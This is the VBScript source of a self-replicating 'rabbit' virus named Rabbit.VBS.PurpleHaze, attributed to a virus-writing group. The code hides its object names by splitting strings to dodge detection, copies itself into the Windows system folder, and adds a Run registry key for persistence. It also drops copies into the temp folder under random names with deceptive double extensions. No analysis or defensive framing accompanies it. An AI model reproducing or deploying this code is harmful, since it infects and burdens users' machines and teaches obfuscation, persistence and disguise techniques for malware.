'Rabbit.VBS.PurpleHaze
'(c)by Necronomikon[D00MRiderz]
dim arg, sys, var1, var2, var3, var4, var5, var6,varx1, varx2
Set arg = WScript.Arguments 'the command line arg.      
VAR1="Scr"
VAR2="ipt"
VAR3="ing."
VAR4="Fi"
VAR5="lesys"
VAR6="temOb"
Set Fso = CreateObject(VAR1+VAR2+VAR3+VAR4+VAR5+VAR6+"ject")
Set sys=fso.GetSpecialFolder(1)
VARX1="S"
VARX2="hell"
Set ws = WScript.CreateObject("W"+VAR1+VAR2+"."+VARX1+VARX2)
fso.GetFile(WScript.ScriptFullName).Copy(sys&"\PurpleHaze.vbs")
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\firstRabbit",sys&"\PurpleHaze.vbs"
ws.RegWrite "HKLM\Software\PurpleHaze", "(c)byNecronomikon[D00MRiderz]"

if arg.count <>  0 then                
if arg.item(0) = "/rabbit" then          
rabbit()                              
elseif arg.item(0) = "/msg" then      
msg()                                 
end if
end if

sub rabbit()
Parent = Wscript.ScriptFullName
Set TempFolder = FSO.GetSpecialFolder(2)
tmpname=""
randomize(timer)
namez=int(rnd(1)*6)+1
For letter = 1 To namez
randomize(timer)
tmpname=tmpname & chr(int(rnd(1)*26)+97)
Next
typext = "arfcra" 'our 1st extension
randomize(timer)
tmpext = int(rnd(1)*11)+1
tmpname=tmpname & "." & mid(typext,((tmpext-1)*3)+1,3) & ".vbs" 'da 2nd extension
FSO.CopyFile Wscript.ScriptFullName, TempFolder& "\" & tmpname
MsgBox tmpname
end sub
Sub msg()
msgbox "i do it like a rabbit...", 64,"Rabbit.VBS.PurpleHaze"
end sub
